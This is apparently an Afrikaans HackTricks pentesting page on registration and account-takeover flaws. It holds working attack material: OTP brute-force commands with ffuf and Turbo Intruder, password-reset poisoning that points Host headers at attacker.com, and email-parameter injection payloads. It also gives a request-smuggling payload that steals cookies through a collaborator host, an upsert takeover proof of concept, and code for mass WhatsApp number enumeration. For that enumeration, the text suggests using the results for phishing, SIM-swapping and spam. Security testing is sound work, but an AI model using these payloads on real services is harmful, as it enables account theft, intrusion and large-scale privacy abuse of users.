# Registrasie- en Oorname Kwesbaarhede

{{#include ../banners/hacktricks-training.md}}

## Registrasie-oorname

### Dubbele registrasie

- Probeer om te registreer met 'n bestaande gebruikersnaam
- Probeer verskillende variasies van die e-pos:
- hoofletters
- +1@
- voeg 'n punt in die e-pos
- spesiale karakters in die e-posnaam (%00, %09, %20)
- Plaas spasie-karakters ná die e-pos: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Probeer e-posverskaffer-kanoniseringstrieke (diens-afhanklik):
- Gmail ignoreer kolletjies en subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` word afgelewer aan `victim@gmail.com`
- Sommige verskaffers is nie-gevoelig vir hooflettergrootte in die local-part
- Sommige verskaffers aanvaar unicode confusables. Probeer homoglyphs en soft hyphen `\u00AD` binne die local-part
- Misbruik dit om: uniekheidskontroles te omseil, dubbele rekeninge/workspace-uitnodigings te bekom, of slagoffer-registrasies te blokkeer (tydelike DoS) terwyl jy 'n oorname voorberei

### Gebruikersnaam-enumerasie

Kyk of jy kan vasstel wanneer 'n gebruikersnaam reeds in die toepassing geregistreer is.

- Verskillende foutboodskappe of HTTP-statuskodes
- Tydsverskille (bestaande gebruiker kan 'n soektog na IdP/DB veroorsaak)
- Registrasievorm vul profieldata outomaties in vir bekende e-posse
- Kyk na span-/uitnodigingsvloei: die invoer van 'n e-pos kan openbaar of 'n rekening bestaan

### Wagwoordbeleid

Wanneer jy 'n gebruiker skep, kontroleer die wagwoordbeleid (kyk of jy swak wagwoorde kan gebruik).  
In daardie geval kan jy probeer om credentials te bruteforce.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth-oorname


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML-kwesbaarhede


{{#ref}}
saml-attacks/
{{#endref}}

### Verander e-pos

Sodra geregistreer, probeer om die e-pos te verander en kontroleer of hierdie verandering korrek gevalideer word of of jy dit na ewekansige e-posadresse kan verander.

### Meer kontroles

- Kyk of jy **weggooibare e-posadresse** (mailinator, yopmail, 1secmail, ens.) kan gebruik of die bloklys omseil met subaddressing soos `victim+mailinator@gmail.com`
- **Lang** **wagwoord** (>200) lei tot **DoS**
- **Kontroleer rate-limiete op rekeningskep**
- Gebruik username@**burp_collab**.net en ontleed die **callback**
- As telefoonnommerverifikasie gebruik word, ondersoek randgevalle vir nommerparsings/injection

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Kontak-ontdekking / identifiseerder-enumerasie orakels

Telefoonnommer-gesentreerde boodskappers openbaar 'n **presence oracle** wanneer die kliënt kontakte sinkroniseer. Herhaling van WhatsApp se discovery-versoeke het histories **>100M soektogte per uur** gelewer, wat byna-volledige rekeningenumerasies moontlik maak.

**Aanvals-werkvloei**

1. **Instrumenteer 'n amptelike kliënt** om die adresboek-oplaaiversoek vas te vang (geauthentiseerde blob van genormaliseerde E.164-nommers). Herhaal dit met deur-aanvaller-gegenereerde nommers terwyl dieselfde koekies/toestel-token hergebruik word.
2. **Groeper nommers per versoek**: WhatsApp aanvaar duisende identifiseerders en stuur geregistreerd/niet-geregistreerd terug plus metadata (business, companion, ens.). Analiseer antwoorde offline om teikelys te bou sonder om slagoffers te boodskap.
3. **Skaleer horisontaal** die enumerasie met SIM-banke, cloud-toestelle, of residensiële proxies sodat per-rekening/IP/ASN throttling nooit uitgelig word nie.

**Inbelplanmodellering**

Modelleer elke land se inbelplan om ongeldige kandidate oor te slaan. Die NDSS-datastel (`country-table.*`) lys landkodes, adoptiedigtheid, en platformsplitsing sodat jy hoë-treffersreekse kan prioritiseer. Example seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritiseer voorvoegsels wat by werklike toewysings pas (Mobile Country Code + National Destination Code) voordat jy die oracle bevraagteken om deurset nuttig te hou.

**Skakel enumerasies om in geteikende aanvalle**

- Voer leaked phone numbers (e.g., Facebook’s 2021 breach) in die oracle in om te bepaal watter identiteite nog aktief is voordat jy phishing, SIM-swapping, of spamming uitvoer.
- Sny sensusse volgens land/OS/app-tipe om streke met swak SMS-filtrering of wye WhatsApp Business-aanvaarding vir gelokaliseerde social engineering te vind.

**Korrelering van hergebruik van publieke sleutels**

WhatsApp openbaar elke rekening se X25519 identity key tydens session setup. Vra identity material op vir elke genommerde nommer en verwyder duplikate van die public keys om account farms, gekloneerde kliënte, of onveilige firmware te openbaar — gedeelde sleutels de-anonimiseer multi-SIM-operasies.

## Swakke e-pos/telefoon verifikasie (OTP/Magic Link)

Registrasie-strome verifieer dikwels eienaarskap via 'n numeriese OTP of 'n magic-link token. Tipiese foute:

- Guessable of kort OTP (4–6 syfers) sonder effektiewe rate limiting of IP/device-bewaking. Probeer parallelle raaisels en header/IP-rotasie.
- OTP-hergebruik oor aksies of rekeninge, of nie gebind aan die spesifieke gebruiker/aksie nie (bv. dieselfde kode werk vir login en signup, of werk ná e-posverandering).
- Multi-value smuggling: sommige backends aanvaar meerdere kodes en verifieer of enige ooreenstem. Probeer:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Komma/pipe-geskeide waardes: `code=000000,123456` of `code=000000|123456`
- Response oracle: onderskei verkeerde vs vervalde vs verkeerde-gebruiker-kodes deur status/boodskap/liggaamlengte.
- Tokens word nie ongeldig gemaak ná sukses of ná wagwoord/e-posverandering nie.
- Verification token nie gebind aan user agent/IP nie, wat cross-origin voltooiing vanaf attacker-controlled bladsye toelaat.

Brute-force voorbeeld met ffuf teen 'n JSON OTP-endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Parallel/concurrent guessing om sequential lockouts te omseil (gebruik Turbo Intruder in Burp):

<details>
<summary>Turbo Intruder snippet om 6‑digit OTP attempts te flood</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Probeer racing verification: submit die selfde geldige OTP simultaan in twee sessions; soms word een session 'n verified attacker account terwyl die victim flow ook slaag.
- Toets ook Host header poisoning op verification links (soos reset poisoning hieronder) om te leak of volledige verification op 'n attacker controlled host te kry.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (voor die victim aanmeld)

'n Kragtige klas van probleme gebeur wanneer 'n attacker aksies op die victim’s email uitvoer voordat die victim hul account skep, en later weer toegang herwin.

Belangrike tegnieke om te toets (pas aan by die teiken se flows):

- Classic–Federated Merge
- Attacker: registers 'n classic account met die victim email en stel 'n password
- Victim: later teken aan met SSO (selfde email)
- Onveilige merges kan beide partye ingelog laat bly of die attacker se toegang weer laat herleef
- Unexpired Session Identifier
- Attacker: skep account en hou 'n long‑lived session (moenie uitlog nie)
- Victim: herstel/stel password en gebruik die account
- Toets of ou sessions geldig bly nadat reset of MFA enablement plaasgevind het
- Trojan Identifier
- Attacker: voeg 'n sekondêre identifier by die pre‑created account (phone, additional email, of link die attacker’s IdP)
- Victim: reset password; attacker gebruik later die trojan identifier om te reset/login
- Unexpired Email Change
- Attacker: initieer email‑change na attacker mail en hou confirmation terug
- Victim: herstel die account en begin dit gebruik
- Attacker: voltooi later die pending email‑change om die account te steel
- Non‑Verifying IdP
- Attacker: gebruik 'n IdP wat nie email ownership verifieer nie om `victim@…` te beweer
- Victim: teken aan via classic route
- Service merge op email sonder om `email_verified` te kontroleer of plaaslike verification uit te voer

Praktiese wenke

- Harvest flows and endpoints vanaf web/mobile bundles. Soek classic signup, SSO linking, email/phone change, en password reset endpoints.
- Skep realistiese automation om sessions lewendig te hou terwyl jy ander flows oefen.
- Vir SSO tests, sit 'n test OIDC provider op en issue tokens met `email` claims vir die victim address en `email_verified=false` om te kyk of die RP onverified IdPs vertrou.
- Na enige password reset of email change, verifieer dat:
- all other sessions and tokens are invalidated,
- pending email/phone change capabilities are cancelled,
- previously linked IdPs/emails/phones are re‑verified.

Nota: Omvattende metodologie en case studies van hierdie tegnieke is deur Microsoft se pre‑hijacking research gedokumenteer (sien References aan die einde).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset na jou email address
2. Klik op die password reset link
3. Moenie die password verander nie
4. Klik op enige 3rd party websites (eg: Facebook, twitter)
5. Intercept die request in Burp Suite proxy
6. Check of die referer header die password reset token is leaking.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept die password reset request in Burp Suite
2. Add of edit die volgende headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward die request met die gemodifiseerde header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Soek na 'n password reset URL gebaseer op die _host header_ soos : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Aanvaller moet met hul rekening aanmeld en na die **Change password** funksie gaan.
2. Begin Burp Suite en intersep die versoek
3. Stuur dit na die repeater tab en wysig die parameters : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Die password reset token moet lukraak gegenereer en uniek wees elke keer.\
Probeer bepaal of die token verval of of dit altyd dieselfde is — in sommige gevalle is die generasie-algoritme swak en kan dit geraai word. Die volgende veranderlikes kan deur die algoritme gebruik word.

- Tydstempel
- UserID
- E-pos van gebruiker
- Voornaam en Van
- Geboortedatum
- Kriptografie
- Slegs nommers
- Klein token-sekwensie ( characters between \[A-Z,a-z,0-9])
- Token hergebruik
- Token vervaldatum

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Inspekteer die bedienerreaksie en kyk vir `resetToken`
3. Gebruik dan die token in 'n URL soos `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registreer op die stelsel met 'n gebruikersnaam identies aan die slagoffer se gebruikersnaam, maar met spasies ingevoeg voor en/of na die gebruikersnaam. e.g: `"admin "`
2. Versoek 'n password reset met jou kwaadwillige gebruikersnaam.
3. Gebruik die token wat na jou e-pos gestuur is en herstel die slagoffer se wagwoord.
4. Meld by die slagoffer se rekening aan met die nuwe wagwoord.

Die platform CTFd was kwesbaar vir hierdie aanval.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Vind 'n XSS binne die toepassing of 'n subdomein indien die cookies aan die ouerdomein geskop is : `*.domain.com`
2. Leak die huidige **sessions cookie**
3. Meld as die gebruiker aan deur die cookie te gebruik

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Gebruik **smuggler** om die tipe HTTP Request Smuggling te identifiseer (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Smee 'n versoek wat die `POST / HTTP/1.1` sal oor skryf met die volgende data:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` met die doel om die slagoffers open redirect na burpcollab te stuur en hul cookies te steel\
3. Die finale versoek kan soos volg lyk
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone-verslae oor die uitbuiting van hierdie fout\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Rekeningoorname via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Skep 'n payload vir die CSRF, bv.: “HTML form with auto submit for a password change”
2. Stuur die payload

### Rekeningoorname via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token mag gebruik word om 'n gebruiker te verifieer.

- Wysig die JWT met 'n ander User ID / Email
- Kontroleer vir 'n swak JWT-handtekening


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Sommige signup-handlers voer 'n upsert uit wanneer die verskafde e-pos reeds bestaan. As die endpoint 'n minimale body aanvaar met 'n e-pos en wagwoord en nie eienaarskapsverifikasie afdwing nie, sal die stuur van die slagoffer se e-pos hul wagwoord pre-auth oorskryf.

- Opsporing: oes endpointname uit gebundelde JS (of mobiele app-verkeer), en fuzz dan basispaaie soos /parents/application/v4/admin/FUZZ met ffuf/dirsearch.
- Metode-wenke: 'n GET wat boodskappe soos "Only POST request is allowed." teruggee, dui dikwels op die korrekte werkwoord en dat 'n JSON body verwag word.
- Minimale body waargeneem in die wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Voorbeeld PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impak: Full Account Takeover (ATO) sonder enige reset token, OTP, of email verification.

## Verwysings

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
